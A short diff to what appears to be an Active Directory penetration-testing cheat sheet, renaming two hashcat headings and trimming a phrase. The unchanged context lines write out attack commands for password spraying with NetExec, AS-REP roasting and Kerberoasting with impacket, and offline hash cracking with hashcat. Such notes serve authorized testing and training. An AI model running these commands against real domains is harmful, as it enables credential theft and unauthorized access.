@@ -69,7 +69,7 @@ netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
 impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
 ```
 
-## Crack ASREPRoast hashes with hashcat
+## Hashcat ASREPRoast
 ```bash
 # Add --show to display already cracked hashes
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
@@ -88,7 +88,7 @@ netexec ldap $IP -u username -p password --users --groups --computers
 impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
 ```
 
-## Crack Kerberoast hashes with hashcat
+## Hashcat Kerberoast
 ```bash
 # Add --show to display already cracked hashes
 hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -499,7 +499,7 @@ When analyzing BloodHound data, focus on:
 **Credential Attacks:**
 - impacket-GetNPUsers for ASREPRoasting
 - NetExec for password spraying (supports multiple protocols)
-- hashcat for hash cracking (GPU accelerated)
+- hashcat for hash cracking 
 
 **Authenticated Enumeration:**
 - bloodhound-python from Kali (stealthy)
